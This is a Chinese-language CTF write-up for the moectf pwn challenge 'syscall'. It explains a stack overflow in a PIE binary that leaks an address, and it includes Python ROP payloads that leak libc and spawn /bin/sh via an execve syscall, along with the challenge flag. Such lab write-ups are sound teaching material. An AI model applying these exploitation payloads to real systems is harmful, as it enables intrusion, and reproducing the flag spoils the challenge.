# syscall

## 题目简述

题目给出一个 64 位 ELF pwn 程序，开启 NX、PIE、Full RELRO，但没有 canary。程序启动时会打印 `gadget` 函数地址，随后进入 `vuln()`。`vuln()` 中 64 字节栈缓冲区被 `read(0, buf, 0x80)` 覆盖，返回地址偏移为 72 字节。

关键点是二进制本身提供了 `pop rdi; ret`、`pop rsi; pop rdx; ret`、`syscall` 和 `"/bin/sh"`，同时第二次 `read` 的返回值可控，可以用 59 字节输入设置 `RAX = 59`，直接触发 `execve("/bin/sh", NULL, NULL)`。

## 解题过程

### 关键观察

`main()` 先泄漏 `gadget` 地址：

```c
puts("I'll give you a gift first!");
printf("%p\n", gadget);
vuln();
```

根据 Ghidra 默认 image base `0x100000` 修正后，关键偏移如下：

```text
pop rdi; ret          0x11b1
pop rsi; pop rdx; ret 0x11b3
ret                  0x11b2
syscall              0x11b6
puts@plt             0x1080
puts@got             0x3fb8
"/bin/sh"            0x4010
vuln                 0x11bb
```

### 利用步骤

第一阶段利用泄漏出的 PIE base 调用 `puts(puts@got)` 泄漏 libc，然后返回 `vuln`：

```python
payload1 = b"A" * 64 + p64(0)
payload1 += p64(pie + RET)
payload1 += p64(pie + POP_RDI) + p64(pie + PUTS_GOT)
payload1 += p64(pie + PUTS_PLT)
payload1 += p64(pie + VULN)
```

第二阶段直接使用二进制内的 `"/bin/sh"` 和 `syscall` gadget：

```python
payload2 = b"A" * 64 + p64(0)
payload2 += p64(pie + POP_RDI) + p64(pie + BINSH)
payload2 += p64(pie + POP_RSI_RDX) + p64(0) + p64(0)
payload2 += p64(pie + SYSCALL)

p.send(payload2.ljust(0x80, b"\x00"))
p.send(b"E" * 59)  # read 返回 59，使 RAX=SYS_execve
```

成功后读取 flag：

```text
moectf{n0w_14m_4_m45732_0f_5y5c411_h4h4_7h475_23411y_c242y}
```

## 方法总结

- 核心技巧：PIE 泄漏 + 栈溢出 ROP + 通过 `read` 返回值控制 `RAX` 执行 syscall。
- 识别信号：程序打印函数地址、无 canary、二进制内存在 `syscall` 和 `"/bin/sh"` 时，可以不依赖 libc `system`。
- 复用要点：Ghidra PE/ELF image base 会影响偏移计算；ret2syscall 里 `RAX` 常被忽略，本题用第二次 `read` 的返回字节数精确设置为 59。
